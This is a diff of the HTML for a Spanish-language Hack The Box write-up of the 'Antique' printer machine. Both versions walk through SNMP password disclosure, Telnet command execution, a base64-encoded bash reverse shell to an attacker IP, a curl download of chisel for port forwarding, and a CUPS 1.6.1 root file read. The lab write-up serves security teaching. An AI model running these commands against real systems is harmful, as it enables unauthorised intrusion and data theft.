@@ -13,13 +13,13 @@
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7rocky.github.io/htb/antique/"><meta property="article:section" content="htb">
 <meta property="article:published_time" content="2021-09-27T00:00:00+01:00">
-<meta property="article:modified_time" content="2022-02-23T10:00:12+01:00"><meta property="og:site_name" content="7Rocky">
+<meta property="article:modified_time" content="2022-02-23T11:55:42+01:00"><meta property="og:site_name" content="7Rocky">
 <meta property="og:image" content="https://7rocky.github.io/images/HTB/Antique/Antique.png">
 <meta property="og:author" content="7Rocky">
 <meta itemprop=name content="Antique">
 <meta itemprop=description content="Hack The Box. Linux. Máquina fácil. Esta máquina es una impresora HP JetDirect que expone la contraseña por SNMP y tiene una vulnerabilidad de lectura privilegiada de archivos. Para comprometer la máquina se necesitan técnicas de enumeración por SNMP y reenvío de puertos. En este write-up se utiliza un programa en Java personalizado para automatizar un ataque de SQLi"><meta itemprop=datePublished content="2021-09-27T00:00:00+01:00">
-<meta itemprop=dateModified content="2022-02-23T10:00:12+01:00">
-<meta itemprop=wordCount content="1384">
+<meta itemprop=dateModified content="2022-02-23T11:55:42+01:00">
+<meta itemprop=wordCount content="1244">
 <meta itemprop=keywords content="cve,snmp,telnet,port-forwarding,rce,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Antique">
@@ -182,180 +182,175 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre></div><p>La máquina tiene abierto el puerto 23 (Telnet).</p>
 <h2 id=conexión-por-telnet>Conexión por Telnet</h2>
 <p>Primero, nos conectamos a la máquina utilizando Telnet, y nos pregunta por una contraseña:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ telnet 10.10.11.107 <span style=color:#ae81ff>23</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>telnet</span> 10.10.11.107 23
 Trying 10.10.11.107
-Connected to 10.10.11.107. 
-Escape character is &#39;^]&#39;.
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>HP JetDirect
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>password:
-</code></pre></div><p>Podemos probar credenciales por defecto para la impresora JetDirect, pero ninguna funciona.</p>
+Connected to 10.10.11.107.  
+Escape character is '^]'.
+
+HP JetDirect
+
+password:
+</code></pre></div>
+<p>Podemos probar credenciales por defecto para la impresora JetDirect, pero ninguna funciona.</p>
 <h2 id=enumeración-por-snmp>Enumeración por SNMP</h2>
 <p>Existe un <em>exploit</em> que muestra cómo las impresoras JetDirect exponen su contraseña por SNMP:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ searchsploit JetDirect
-------------------------------------------------------------------------------- ---------------------------
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>searchsploit</span> JetDirect
+------------------------------------------------------------------------------- ---------------------------  
  Exploit Title                                                                 | Path
 ------------------------------------------------------------------------------- ---------------------------
- HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit)           | unix/remote/45273.rb
- HP JetDirect FTP Print Server - &#39;RERT&#39; Denial of Service                      | windows/dos/29787.py
- HP JetDirect J3111A - Invalid FTP Command Denial of Service                   | hardware/dos/20090.txt
- HP JetDirect PJL - Interface Universal Directory Traversal (Metasploit)       | hardware/remote/17635.rb
- HP JetDirect PJL - Query Execution (Metasploit)                               | hardware/remote/17636.rb
- HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure               | hardware/remote/22319.txt
- HP JetDirect rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification | hardware/remote/20565.c
+ HP <span class=code-red>Jetdirect</span> - Path Traversal Arbitrary Code Execution (Metasploit)           | unix/remote/45273.rb
+ HP <span class=code-red>JetDirect</span> FTP Print Server - 'RERT' Denial of Service                      | windows/dos/29787.py
+ HP <span class=code-red>JetDirect</span> J3111A - Invalid FTP Command Denial of Service                   | hardware/dos/20090.txt
+ HP <span class=code-red>JetDirect</span> PJL - Interface Universal Directory Traversal (Metasploit)       | hardware/remote/17635.rb
+ HP <span class=code-red>JetDirect</span> PJL - Query Execution (Metasploit)                               | hardware/remote/17636.rb
+ HP <span class=code-red>JetDirect</span> Printer - SNMP JetAdmin Device Password Disclosure               | hardware/remote/22319.txt
+ HP <span class=code-red>JetDirect</span> rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification | hardware/remote/20565.c
 ------------------------------------------------------------------------------- ---------------------------
 Shellcodes: No Results
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>$ searchsploit -x <span style=color:#ae81ff>22319</span>
+
+<span class=code-cyan>$</span> <span class=code-dark-green>searchsploit</span> -x 22319
 HP JetDirect J2552A/J2552B/J2591A/J3110A/J3111A/J3113A/J3263A/300.0 X Printer SNMP JetAdmin Device Password Disclosure Vulnerability
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>source: https://www.securityfocus.com/bid/7001/info
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>A problem with JetDirect printers could make it possible for a remote user to gain administrative access to the printer.
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>It has been reported that HP JetDirect printers leak the web JetAdmin device password under some circumstances. By sending an SNMP GET request to a vulnerable printer, the printer will return the hex-encoded device password to the requester. This could allow a remote user to access and change configuration of the printer. 
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>C:\&gt;snmputil get example.printer public .1.3.6.1.4.1.11.2.3.9.1.1.13.0
-</code></pre></div><p>Podemos ver si el puerto 161 (SNMP) está abierto utilizando un escaneo por UDP mediante <code>nmap</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console># nmap -sU 10.10.11.107 -p <span style=color:#ae81ff>161</span>
+
+source: https://www.securityfocus.com/bid/7001/info
+
+A problem with JetDirect printers could make it possible for a remote user to gain administrative access to the printer.
+
+It has been reported that HP JetDirect printers leak the web JetAdmin device password under some circumstances. By sending an SNMP GET request to a vulnerable printer, the printer will return the hex-encoded device password to the requester. This could allow a remote user to access and change configuration of the printer.  
+
+C:\&gt;snmputil get example.printer public .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+</code></pre></div>
+<p>Podemos ver si el puerto 161 (SNMP) está abierto utilizando un escaneo por UDP mediante <code>nmap</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-red>#</span> <span class=code-dark-green>nmap</span> -sU 10.10.11.107 -p 161
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 10.10.11.107
 Host is up (0.048s latency).
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>PORT    STATE  SERVICE
+
+PORT    STATE  SERVICE
 161/udp open   snmp
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds 
-</code></pre></div><p>Ahora, podemos utilizar <code>snmpwalk</code> de manera similar a como muestra el <em>exploit</em>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ snmpwalk -v2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
-</code></pre></div><h2 id=encontrando-una-contraseña>Encontrando una contraseña</h2>
+
+Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds  
+</code></pre></div>
+<p>Ahora, podemos utilizar <code>snmpwalk</code> de manera similar a como muestra el <em>exploit</em>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>snmpwalk</span> -v2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+
+iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135  
+</code></pre></div>
+<h2 id=encontrando-una-contraseña>Encontrando una contraseña</h2>
 <p>La información anterior son caracteres representados en hexadecimal. Podemos escribir un <em>script</em> en Python llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/blob/main/Machines/Antique/decode.py><code>decode.py</code></a> para decodificarlos (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Antique#decodepy>aquí</a>).</p>
 <p>Si tratamos de decodificar la lista completa de dígitos, obtendremos errores:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 decode.py <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>77</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>31</span> <span style=color:#ae81ff>32</span> <span style=color:#ae81ff>33</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>31</span> <span style=color:#ae81ff>32</span> <span style=color:#ae81ff>33</span> <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>3</span> <span style=color:#ae81ff>9</span> <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>22</span> <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>26</span> <span style=color:#ae81ff>27</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>31</span> <span style=color:#ae81ff>33</span> <span style=color:#ae81ff>34</span> <span style=color:#ae81ff>35</span> <span style=color:#ae81ff>37</span> <span style=color:#ae81ff>38</span> <span style=color:#ae81ff>39</span> <span style=color:#ae81ff>42</span> <span style=color:#ae81ff>43</span> <span style=color:#ae81ff>49</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>51</span> <span style=color:#ae81ff>54</span> <span style=color:#ae81ff>57</span> <span style=color:#ae81ff>58</span> <span style=color:#ae81ff>61</span> <span style=color:#ae81ff>65</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>75</span> <span style=color:#ae81ff>79</span> <span style=color:#ae81ff>82</span> <span style=color:#ae81ff>83</span> <span style=color:#ae81ff>86</span> <span style=color:#ae81ff>90</span> <span style=color:#ae81ff>91</span> <span style=color:#ae81ff>94</span> <span style=color:#ae81ff>95</span> <span style=color:#ae81ff>98</span> <span style=color:#ae81ff>103</span> <span style=color:#ae81ff>106</span> <span style=color:#ae81ff>111</span> <span style=color:#ae81ff>114</span> <span style=color:#ae81ff>115</span> <span style=color:#ae81ff>119</span> <span style=color:#ae81ff>122</span> <span style=color:#ae81ff>123</span> <span style=color:#ae81ff>126</span> <span style=color:#ae81ff>130</span> <span style=color:#ae81ff>131</span> <span style=color:#ae81ff>134</span> <span style=color:#ae81ff>135</span> 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> decode.py 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135  
 binascii.Error Odd-length string
-</code></pre></div><p>Podemos ir quitando dígitos por el final hasta no tener ningún error:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 decode.py <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>73</span> <span style=color:#ae81ff>77</span> <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>72</span> <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>31</span> <span style=color:#ae81ff>32</span> <span style=color:#ae81ff>33</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>31</span> <span style=color:#ae81ff>32</span> <span style=color:#ae81ff>33</span> 
+</code></pre></div>
+<p>Podemos ir quitando dígitos por el final hasta no tener ningún error:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> decode.py 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33  
 P@ssw0rd@123!!123
-</code></pre></div><h2 id=intrusión-en-la-máquina>Intrusión en la máquina</h2>
+</code></pre></div>
+<h2 id=intrusión-en-la-máquina>Intrusión en la máquina</h2>
 <p>Y con esto, tenemos la contraseña de la impresora y nos podemos conectar por Telnet:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ telnet 10.10.11.107 <span style=color:#ae81ff>23</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>telnet</span> 10.10.11.107 23
 Trying 10.10.11.107
 Connected to 10.10.11.107.
-Escape character is &#39;^]&#39;.
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>HP JetDirect
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>password: P@ssw0rd@123!!123
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>Please type &#34;?&#34; for HELP
+Escape character is '^]'.
+
+HP JetDirect
+
+password: P@ssw0rd@123!!123
+
+Please type "?" for HELP
 &gt; ?
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>To Change/Configure Parameters Enter:
+
+To Change/Configure Parameters Enter:
 Parameter-name: value &lt;Carriage Return&gt;
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>Parameter-name Type of value
+
+Parameter-name Type of value
 ip: IP-address in dotted notation
 subnet-mask: address in dotted notation (enter 0 for default)
 default-gw: address in dotted notation (enter 0 for default)
 syslog-svr: address in dotted notation (enter 0 for default)
 idle-timeout: seconds in integers
 set-cmnty-name: alpha-numeric string (32 chars max)
-host-name: alpha-numeric string (upper case only, 32 chars max) 
+host-name: alpha-numeric string (upper case only, 32 chars max)  
 dhcp-config: 0 to disable, 1 to enable
 allow: &lt;ip&gt; [mask] (0 to clear, list to display, 10 max)
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>addrawport: &lt;TCP port num&gt; (&lt;TCP port num&gt; 3000-9000)
+
+addrawport: &lt;TCP port num&gt; (&lt;TCP port num&gt; 3000-9000)
 deleterawport: &lt;TCP port num&gt;
 listrawport: (No parameter required)
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>exec: execute system commands (exec id)
+
+exec: execute system commands (exec id)
 exit: quit from telnet session
-</code></pre></div><p>Vemos que existe un comando llamado <code>exec</code> que permite ejecutar comandos de sistema:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>&gt; exec id
-uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin) 
-</code></pre></div><p>Por tanto, ahora nos podemos conectar a la máquina utilizando una <em>reverse shell</em>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ echo -n <span style=color:#e6db74>&#39;bash  -i &gt;&amp; /dev/tcp/10.10.17.44/4444 0&gt;&amp;1&#39;</span> | base64 
+</code></pre></div>
+<p>Vemos que existe un comando llamado <code>exec</code> que permite ejecutar comandos de sistema:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>&gt; exec id
+uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)  
+</code></pre></div>
+<p>Por tanto, ahora nos podemos conectar a la máquina utilizando una <em>reverse shell</em>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> -n <span class=code-dark-yellow>'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class=code-dark-green>base64</span>  
 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>&gt; exec echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash 
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ nc -nlvp <span style=color:#ae81ff>4444</span>
+</code></pre></div>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>&gt; exec echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash  
+</code></pre></div>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 Ncat: Connection from 10.10.11.107.
 Ncat: Connection from 10.10.11.107:54808.
-bash: cannot set terminal process group (812): Inappropriate ioctl for device 
+bash: cannot set terminal process group (812): Inappropriate ioctl for device  
 bash: no job control in this shell
 lp@antique:~$ script /dev/null -c bash
 Script started, file is /dev/null
 lp@antique:~$ ^Z
 zsh: suspended  ncat -nlvp 4444
-<span style=color:#960050;background-color:#1e0010>
-</span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
+
+<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
 [1]  + continued  ncat -nlvp 4444
                                  reset xterm
 lp@antique:~$ export TERM=xterm
 lp@antique:~$ export SHELL=bash
-lp@antique:~$ stty rows 50 columns 158 
-</code></pre></div><h2 id=enumeración-del-sistema>Enumeración del sistema</h2>
+lp@antique:~$ stty rows 50 columns 158
+</code></pre></div>
+<h2 id=enumeración-del-sistema>Enumeración del sistema</h2>
 <p>Como usuario <code>lp</code> podemos leer la <em>flag</em> <code>user.txt</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>lp@antique:~$ cat user.txt
-ea8fbeada4a37b5e23f862098f36d72b 
-</code></pre></div><p>Listando los puertos internos abiertos, vemos que el puerto 631 (IPP) está abierto:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>lp@antique:~$ netstat -nat
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>lp@antique:~$ cat user.txt
+ea8fbeada4a37b5e23f862098f36d72b  
+</code></pre></div>
+<p>Listando los puertos internos abiertos, vemos que el puerto 631 (IPP) está abierto:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>lp@antique:~$ netstat -nat | grep LISTEN
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State
-tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN  
 tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN
-tcp        0      0 10.10.11.107:23         10.10.15.131:40080      ESTABLISHED 
-tcp        1      0 10.10.11.107:54806      10.10.17.44:4444        CLOSE_WAIT
-tcp       32      0 10.10.11.107:23         10.10.15.119:43310      CLOSE_WAIT
-tcp        0      0 10.10.11.107:37986      10.10.17.44:1337        ESTABLISHED
-tcp        0     13 10.10.11.107:54808      10.10.17.44:4444        ESTABLISHED
-tcp       20      0 10.10.11.107:23         10.10.17.44:61674       CLOSE_WAIT
-tcp        0      0 10.10.11.107:23         10.10.17.44:62607       ESTABLISHED
-tcp        0      0 10.10.11.107:55070      10.10.15.119:1234       CLOSE_WAIT
 tcp6       0      0 ::1:631                 :::*                    LISTEN
-</code></pre></div><p>Para explorar este puerto, podemos realizar un reenvío de puertos utilizando <a href=https://github.com/jpillora/chisel><code>chisel</code></a>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>lp@antique:~$ netstat -nat
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State
-tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN
-tcp        1      0 10.10.11.107:54806      10.10.17.44:4444        CLOSE_WAIT
-tcp        0      0 10.10.11.107:37986      10.10.17.44:1337        ESTABLISHED 
-tcp        0     13 10.10.11.107:54808      10.10.17.44:4444        ESTABLISHED
-tcp       20      0 10.10.11.107:23         10.10.17.44:61674       CLOSE_WAIT
-tcp        0      0 10.10.11.107:23         10.10.17.44:62607       ESTABLISHED
-tcp6       0      0 ::1:631                 :::*                    LISTEN
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ./chisel server -p <span style=color:#ae81ff>1337</span> --reverse
+</code></pre></div>
+<p>Para explorar este puerto, podemos realizar un reenvío de puertos utilizando <a href=https://github.com/jpillora/chisel><code>chisel</code></a>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./chisel</span> server -p 1337 --reverse
 server: Reverse tunnelling enabled
-server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY= 
+server: Fingerprint lEVau5AqQ5yJn+cIJcdKHCOmSYVFY67kTuCt1JtmjtY=  
 server: Listening on http://0.0.0.0:1337
-server: session#1: tun: proxy#R:631=&gt;631: Listening
-</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>lp@antique:~$ cd /tmp
-lp@antique:/tmp$ curl 10.10.17.44/chisel -o chisel
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current 
-                                 Dload  Upload   Total   Spent    Left  Speed
-100 2315k  100 2315k    0     0   402k      0  0:00:05  0:00:05 --:--:--  409k
+server: session#1: tun: proxy#R:631=>631: Listening
+</code></pre></div>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>lp@antique:~$ cd /tmp
+lp@antique:/tmp$ curl 10.10.17.44/chisel -so chisel
 lp@antique:/tmp$ chmod +x chisel
-lp@antique:/tmp$ ./chisel client 10.10.17.44:1337 R:631:127.0.0.1:631
+lp@antique:/tmp$ ./chisel client 10.10.17.44:1337 R:631:127.0.0.1:631  
 client: Connecting to ws://10.10.17.44:1337
 client: Connected (Latency 109.928393ms)
-</code></pre></div><p>Y ahora podemos acceder al puerto 631 desde nuestra máquina. Con el navegador, vemos que está ejecutando CUPS 1.6.1:</p>
-<p><img src=../../../images/HTB/Antique/Antique-CUPS.png alt="CUPS 1.6.1"></p>
+</code></pre></div>
+<p>Y ahora podemos acceder al puerto 631 desde nuestra máquina. Con el navegador, vemos que está ejecutando CUPS 1.6.1:</p>
+<p><img src=/images/HTB/Antique/Antique-CUPS.png alt="CUPS 1.6.1"></p>
 <h2 id=lectura-de-archivos-a-través-de-cups>Lectura de archivos a través de CUPS</h2>
 <p>CUPS 1.6.1 tiene una vulnerabilidad de lectura de archivos (con permisos de <code>root</code>), encontrada <a href=https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/>aquí</a>. Lo único que necesitamos es cambiar la configuración de CUPS para que el registro de errores apunte al archivo que queremos leer (<code>/root/root.txt</code>, <code>/etc/shadow</code> o lo que sea).</p>
 <p>No tenemos permiso para cambiar la configuración desde el navegador porque necesitamos credenciales (la contraseña anterior no funciona):</p>
-<p><img src=../../../images/HTB/Antique/Antique-CUPS-auth.png alt="CUPS authentication"></p>
+<p><img src=/images/HTB/Antique/Antique-CUPS-auth.png alt="CUPS authentication"></p>
 <p>Sin embargo, podemos utilizar <code>cupsctl</code> desde la máquina, porque el usuario <code>lp</code> pertenece al grupo <code>lpadmin</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>lp@antique:/tmp$ cupsctl ErrorLog=&#34;/root/root.txt&#34; 
-</code></pre></div><p>Y ahora, podemos leer la <em>flag</em> <code>root.txt</code> (desde el navegador o mediante <code>curl</code>):</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>lp@antique:/tmp$ curl -s http://localhost:631/admin/log/error_log 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>lp@antique:/tmp$ cupsctl ErrorLog="/root/root.txt"  
+</code></pre></div>
+<p>Y ahora, podemos leer la <em>flag</em> <code>root.txt</code> (desde el navegador o mediante <code>curl</code>):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>lp@antique:/tmp$ curl -s http://localhost:631/admin/log/error_log  
 fc93061adb9c109d8984391d4cdadeed
-</code></pre></div><p>En este caso, no se puede conseguir una consola de comandos como <code>root</code>, ya que no hay servicio de SSH (y entonces <code>root</code> no tiene clave privada). Lo único que podríamos hacer es tratar de romper el <em>hash</em> de <code>root</code> en <code>/etc/shadow</code> con <code>rockyou.txt</code>, pero sin éxito.</p>
+</code></pre></div>
+<p>En este caso, no se puede conseguir una consola de comandos como <code>root</code>, ya que no hay servicio de SSH (y entonces <code>root</code> no tiene clave privada). Lo único que podríamos hacer es tratar de romper el <em>hash</em> de <code>root</code> en <code>/etc/shadow</code> con <code>rockyou.txt</code>, pero sin éxito.</p>
 <div class="mt6 instapaper_ignoref">
 </div>
 </div>
